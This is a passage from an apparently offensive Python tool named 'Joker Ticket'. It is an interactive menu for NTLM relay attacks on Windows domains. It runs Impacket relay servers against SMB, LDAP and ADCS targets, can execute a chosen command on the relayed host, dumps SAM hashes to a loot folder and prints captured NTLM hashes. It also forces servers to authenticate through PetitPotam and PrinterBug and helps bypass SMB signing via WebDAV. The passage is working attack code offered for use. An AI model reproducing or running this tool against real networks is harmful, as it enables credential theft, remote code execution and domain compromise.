                ips.append(m.group(1))
    except:
        pass
    if not ips:
        try:
            ips.append(socket.gethostbyname(socket.gethostname()))
        except:
            ips.append('127.0.0.1')
    return ips

# ============================================================
# Mode Implementations
# ============================================================

# Global session manager
session_manager = RelaySessionManager()

def mode_relay_server():
    """Relay Server Mode using original NTLMRelayX API"""
    print_status("Relay Server Mode (Original Impacket API)", "info")

    # Get targets
    print(Fore.YELLOW + "\n[Target Configuration]" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Single target" + Style.RESET_ALL)
    print(Fore.WHITE + "    2. Multiple targets from file" + Style.RESET_ALL)
    print(Fore.WHITE + "    3. WebDAV target (bypass signing)" + Style.RESET_ALL)

    target_choice = get_input(Fore.CYAN + "\n[?] Choose (1-3): " + Style.RESET_ALL,
                              validator=lambda x: x in ['1', '2', '3'])

    if target_choice is None:
        return

    targets = []

    if target_choice == '1':
        target_str = get_input(Fore.CYAN + "[?] Target (IP or smb://IP or ldap://IP): " + Style.RESET_ALL)
        if target_str is None:
            return

        # Parse target
        if target_str.startswith('smb://'):
            targets.append(RelayTarget(protocol='smb', host=target_str[6:]))
        elif target_str.startswith('ldap://'):
            targets.append(RelayTarget(protocol='ldap', host=target_str[7:]))
        elif target_str.startswith('ldaps://'):
            targets.append(RelayTarget(protocol='ldaps', host=target_str[8:]))
        elif target_str.startswith('adcs://'):
            targets.append(RelayTarget(protocol='adcs', host=target_str[7:]))
        else:
            targets.append(RelayTarget(protocol='smb', host=target_str))

    elif target_choice == '2':
        target_file = get_input(Fore.CYAN + "[?] Targets file path: " + Style.RESET_ALL)
        if target_file is None or not os.path.isfile(target_file):
            print_status("File not found", "error")
            return

        with open(target_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if line.startswith('smb://'):
                        targets.append(RelayTarget(protocol='smb', host=line[6:]))
                    elif line.startswith('ldap://'):
                        targets.append(RelayTarget(protocol='ldap', host=line[7:]))
                    else:
                        targets.append(RelayTarget(protocol='smb', host=line))
        print_status(f"Loaded {len(targets)} targets", "good")

    else:  # WebDAV target
        webdav_str = get_input(Fore.CYAN + "[?] WebDAV target (format: IP[:port]/path): " + Style.RESET_ALL)
        if webdav_str is None:
            return
        webdav = WebDAVTarget.parse(webdav_str)
        if webdav:
            targets.append(RelayTarget(protocol='http', host=webdav.get_url()))
            print_status(f"WebDAV target: {webdav.get_url()}", "info")

    if not targets:
        print_status("No valid targets configured", "error")
        return

    # Interface selection
    ips = get_all_ips()
    print(Fore.CYAN + f"\n[*] Available IPs:" + Style.RESET_ALL)
    for i, ip in enumerate(ips, 1):
        print(Fore.WHITE + f"    {i}. {ip}" + Style.RESET_ALL)

    bind_ip = get_input(Fore.CYAN + f"[?] Interface IP to listen on [{ips[0]}]: " + Style.RESET_ALL,
                        validator=validate_ip, allow_empty=True)
    if bind_ip is None:
        return
    bind_ip = bind_ip if bind_ip else ips[0]

    # Features
    print(Fore.YELLOW + "\n[Features]" + Style.RESET_ALL)

    enable_socks = get_input(Fore.CYAN + "[?] Enable SOCKS proxy? (y/n) [n]: " + Style.RESET_ALL, allow_empty=True)
    socks_enabled = enable_socks and enable_socks.lower() == 'y'

    exec_cmd = get_input(Fore.CYAN + "[?] Command to execute on target (optional): " + Style.RESET_ALL, allow_empty=True)

    dump_hashes = get_input(Fore.CYAN + "[?] Auto-dump SAM hashes? (y/n) [n]: " + Style.RESET_ALL, allow_empty=True)

    smb2support = get_input(Fore.CYAN + "[?] Enable SMB2 support? (y/n) [y]: " + Style.RESET_ALL, allow_empty=True)
    smb2 = smb2support.lower() != 'n' if smb2support else True

    # Setup and start
    try:
        config = session_manager.setup_config(
            bind_ip=bind_ip,
            targets=targets,
            enable_socks=socks_enabled,
            command=exec_cmd if exec_cmd else None,
            dump_hashes=dump_hashes and dump_hashes.lower() == 'y',
            smb2support=smb2
        )
    except Exception as e:
        print_status(f"Config setup failed: {e}", "error")
        traceback.print_exc()
        return

    if session_manager.start_servers(bind_ip):
        print_status(f"Relay servers started on {bind_ip}", "good")
        print_status("Waiting for connections (Ctrl+C to stop)...", "info")
        print_status("Interactive shells (if enabled) on 127.0.0.1:11000+ - use nc 127.0.0.1 11000", "info")
        print_status("SAM dumps saved to ./loot/ directory", "info")

        # Session display thread
        def show_sessions():
            last_count = 0
            while session_manager.running:
                time.sleep(2)
                sessions = session_manager.get_sessions()
                if len(sessions) > last_count:
                    print_status(f"Total captured sessions: {len(sessions)}", "info")
                    # Show latest session details
                    latest = sessions[-1]
                    print_status(f"Latest: {latest.domain}\\{latest.username} from {latest.source_ip}", "good")
                    if latest.ntlm_hash:
                        hash_str = latest.ntlm_hash.hex() if isinstance(latest.ntlm_hash, bytes) else str(latest.ntlm_hash)
                        print_status(f"Hash: {hash_str[:64]}...", "info")
                        # Display full hash for copy-paste
                        print(Fore.YELLOW + f"[NTLM HASH] {latest.domain}\\{latest.username}:{hash_str}" + Style.RESET_ALL)
                    last_count = len(sessions)

        display_thread = threading.Thread(target=show_sessions, daemon=True)
        display_thread.start()

        try:
            while session_manager.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print_status("Shutting down...", "warning")
        finally:
            session_manager.stop_servers()

        stats = session_manager.get_stats()
        print_status(f"Summary: {stats['successful_relays']} successful, {stats['failed_relays']} failed", "info")
    else:
        print_status("Failed to start relay servers", "error")

def mode_petitpotam():
    """PetitPotam coercion mode with original tool logic"""
    print_status("PetitPotam Coercion Mode (Original Multi-pipe Logic)", "info")

    listener_ip = get_input(Fore.CYAN + "\n[?] Listener IP (Attacker): " + Style.RESET_ALL, validator=validate_ip)
    if listener_ip is None:
        return

    target_ip = get_input(Fore.CYAN + "[?] Target IP (Server to coerce): " + Style.RESET_ALL, validator=validate_ip)
    if target_ip is None:
        return

    print(Fore.YELLOW + "\n[Pipe Selection]" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. lsarpc (default)" + Style.RESET_ALL)
    print(Fore.WHITE + "    2. efsrpc" + Style.RESET_ALL)
    print(Fore.WHITE + "    3. samr" + Style.RESET_ALL)
    print(Fore.WHITE + "    4. netlogon" + Style.RESET_ALL)
    print(Fore.WHITE + "    5. lsass" + Style.RESET_ALL)
    print(Fore.WHITE + "    6. All pipes (auto-fallback)" + Style.RESET_ALL)

    pipe_choice = get_input(Fore.CYAN + "[?] Choose pipe (1-6) [6]: " + Style.RESET_ALL, 
                           validator=lambda x: x in ['1','2','3','4','5','6'], allow_empty=True)
    pipe_map = {'1': 'lsarpc', '2': 'efsrpc', '3': 'samr', '4': 'netlogon', '5': 'lsass'}
    selected_pipe = pipe_map.get(pipe_choice, 'all') if pipe_choice else 'all'

    use_auth = get_input(Fore.CYAN + "[?] Use authentication? (y/n) [n]: " + Style.RESET_ALL, allow_empty=True)

    username = password = domain = ''
    if use_auth and use_auth.lower() == 'y':
        domain = get_input(Fore.CYAN + "[?] Domain: " + Style.RESET_ALL)
        username = get_input(Fore.CYAN + "[?] Username: " + Style.RESET_ALL)
        password = get_input(Fore.CYAN + "[?] Password: " + Style.RESET_ALL, password=True)
        if None in [domain, username, password]:
            return

    use_kerb = get_input(Fore.CYAN + "[?] Use Kerberos? (y/n) [n]: " + Style.RESET_ALL, allow_empty=True)

    fallback = get_input(Fore.CYAN + "[?] Use fallback methods (Encrypt/Decrypt)? (y/n) [y]: " + Style.RESET_ALL, allow_empty=True)
    use_fallback = fallback.lower() != 'n' if fallback else True

    confirm = get_input(Fore.CYAN + "\n[?] Run Attack? (y/n): " + Style.RESET_ALL,
                        validator=lambda x: x.lower() in ['y', 'n'])
    if confirm is None or confirm.lower() == 'n':
        return

    # Initialize coercion engine with original logic
    coerce = CoerceAuthEngine(username=username, password=password, domain=domain)
    coerce.set_target_ip(target_ip)

    if use_kerb and use_kerb.lower() == 'y':
        coerce.set_kerberos(True, dc_host=target_ip)

    try:
        success, message = coerce.coerce_petitpotam(listener_ip, target_ip, use_fallback, selected_pipe)

        if success:
            print_status(f"PetitPotam successful: {message}", "good")
        else:
            print_status(f"PetitPotam failed: {message}", "error")
    except Exception as e:
        print_status(f"Unexpected error: {str(e)}", "error")
        traceback.print_exc()

def mode_printerbug():
    """PrinterBug coercion mode with original tool logic"""
    print_status("PrinterBug Coercion Mode (Original MS-RPRN Logic)", "info")

    target_ip = get_input(Fore.CYAN + "\n[?] Target IP (Server to coerce): " + Style.RESET_ALL, validator=validate_ip)
    if target_ip is None:
        return

    listener_ip = get_input(Fore.CYAN + "[?] Listener IP (Attacker): " + Style.RESET_ALL, validator=validate_ip)
    if listener_ip is None:
        return

    port_choice = get_input(Fore.CYAN + "[?] Port (139/445) [445]: " + Style.RESET_ALL,
                           validator=lambda x: x in ['139', '445'], allow_empty=True)
    port = int(port_choice) if port_choice else 445

    use_auth = get_input(Fore.CYAN + "[?] Use authentication? (y/n) [n]: " + Style.RESET_ALL, allow_empty=True)

    username = password = domain = ''
    if use_auth and use_auth.lower() == 'y':
        domain = get_input(Fore.CYAN + "[?] Domain: " + Style.RESET_ALL)
        username = get_input(Fore.CYAN + "[?] Username: " + Style.RESET_ALL)
        password = get_input(Fore.CYAN + "[?] Password: " + Style.RESET_ALL, password=True)
        if None in [domain, username, password]:
            return

    confirm = get_input(Fore.CYAN + "\n[?] Run Attack? (y/n): " + Style.RESET_ALL,
                        validator=lambda x: x.lower() in ['y', 'n'])
    if confirm is None or confirm.lower() == 'n':
        return

    coerce = CoerceAuthEngine(username=username, password=password, domain=domain)
    coerce.set_target_ip(target_ip)

    try:
        success, message = coerce.coerce_printerbug(listener_ip, target_ip, port)

        if success:
            print_status(f"PrinterBug successful: {message}", "good")
        else:
            print_status(f"PrinterBug failed: {message}", "error")
    except Exception as e:
        print_status(f"Unexpected error: {str(e)}", "error")
        traceback.print_exc()

def mode_shadow_coercion():
    """Shadow Coercion mode - placeholder for MS-FSRVP"""
    print_status("Shadow Coercion Mode (MS-FSRVP - Placeholder)", "info")
    print(Fore.YELLOW + "\n[!] Note: Shadow Coercion requires MS-FSRVP protocol implementation." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] This is a simplified placeholder. For full attack, use specialized tools." + Style.RESET_ALL)

    listener_ip = get_input(Fore.CYAN + "\n[?] Listener IP (Attacker): " + Style.RESET_ALL, validator=validate_ip)
    if listener_ip is None:
        return

    target_ip = get_input(Fore.CYAN + "[?] Target IP (Server to coerce): " + Style.RESET_ALL, validator=validate_ip)
    if target_ip is None:
        return

    confirm = get_input(Fore.CYAN + "\n[?] Run Attack? (y/n): " + Style.RESET_ALL,
                        validator=lambda x: x.lower() in ['y', 'n'])
    if confirm is None or confirm.lower() == 'n':
        return

    print_status("Shadow Coercion is not fully implemented in this version.", "warning")
    print_status("Consider using native MS-FSRVP tools for this attack vector.", "info")

def mode_webdav():
    """WebDAV helper mode"""
    print_status("WebDAV Relay Helper (Bypass SMB Signing)", "info")

    webdav_input = get_input(Fore.CYAN + "\n[?] WebDAV target (format: IP[:port]/path): " + Style.RESET_ALL)
    if webdav_input is None:
        return

    webdav = WebDAVTarget.parse(webdav_input)
    if not webdav:
        print_status("Invalid WebDAV format", "error")
        return

    print_status(f"Parsed target:", "info")
    print(Fore.WHITE + f"    Host: {webdav.host}" + Style.RESET_ALL)
    print(Fore.WHITE + f"    Port: {webdav.port}" + Style.RESET_ALL)
    print(Fore.WHITE + f"    Path: {webdav.path}" + Style.RESET_ALL)
    print(Fore.WHITE + f"    URL: {webdav.get_url()}" + Style.RESET_ALL)
    print(Fore.WHITE + f"    UNC for coercion: {webdav.get_unc_path()}" + Style.RESET_ALL)

    print_status("\nTo use this for coercion:", "info")
    print(Fore.YELLOW + f"  PetitPotam: {webdav.get_unc_path()}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"  PrinterBug: {webdav.get_unc_path()}" + Style.RESET_ALL)

    input("\nPress Enter to continue...")

def mode_session_manager():
    """Session management mode"""
    print_status("Session Manager", "info")

    while True:
        sessions = session_manager.get_sessions()
        stats = session_manager.get_stats()

        print(Fore.YELLOW + "\n[Session Status]" + Style.RESET_ALL)
        print(Fore.WHITE + f"    Total Sessions: {stats['total_sessions']}" + Style.RESET_ALL)
        print(Fore.WHITE + f"    Successful Relays: {stats['successful_relays']}" + Style.RESET_ALL)
        print(Fore.WHITE + f"    Failed Relays: {stats['failed_relays']}" + Style.RESET_ALL)
        print(Fore.WHITE + f"    Active Servers: {stats['active_servers']}" + Style.RESET_ALL)

        if sessions:
            print(Fore.YELLOW + "\n[Captured Sessions]" + Style.RESET_ALL)
            for i, s in enumerate(sessions[-10:]):
                print(Fore.WHITE + f"    {i+1}. {s}" + Style.RESET_ALL)

        print(Fore.WHITE + "\n    1. Clear sessions" + Style.RESET_ALL)
        print(Fore.WHITE + "    2. Show pending sessions" + Style.RESET_ALL)
        print(Fore.WHITE + "    3. Back to main menu" + Style.RESET_ALL)

        choice = get_input(Fore.CYAN + "\n[?] Choose (1-3): " + Style.RESET_ALL,
                          validator=lambda x: x in ['1', '2', '3'])

        if choice == '1':
            session_manager.active_sessions.clear()
            print_status("Sessions cleared", "good")
        elif choice == '2':
            pending = session_manager.get_pending_sessions()
            if not pending:
                print_status("No pending sessions", "warning")
            else:
                print_status(f"Found {len(pending)} pending sessions", "info")
                for s in pending:
                    print(Fore.WHITE + f"    - {s}" + Style.RESET_ALL)
        else:
            break

# ============================================================
# Main Menu
# ============================================================

def main():
    while True:
        banner()

        choice = get_input(Fore.CYAN + "\n[?] Select mode (1-7): " + Style.RESET_ALL,
                          validator=lambda x: x in ['1', '2', '3', '4', '5', '6', '7'])

        if choice == '1':
            mode_relay_server()
        elif choice == '2':
            mode_petitpotam()
        elif choice == '3':
            mode_printerbug()
        elif choice == '4':
            mode_shadow_coercion()
        elif choice == '5':
            mode_webdav()
        elif choice == '6':
            mode_session_manager()
        elif choice == '7' or choice is None:
            print_status("Exiting Joker Ticket. Goodbye!", "info")
            session_manager.stop_servers()
            break

        get_input(Fore.WHITE + "\nPress Enter to return to main menu..." + Style.RESET_ALL, allow_empty=True)

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(Fore.RED + f"\n[!] Fatal Error: {e}" + Style.RESET_ALL)
        traceback.print_exc()
        sys.exit(1)
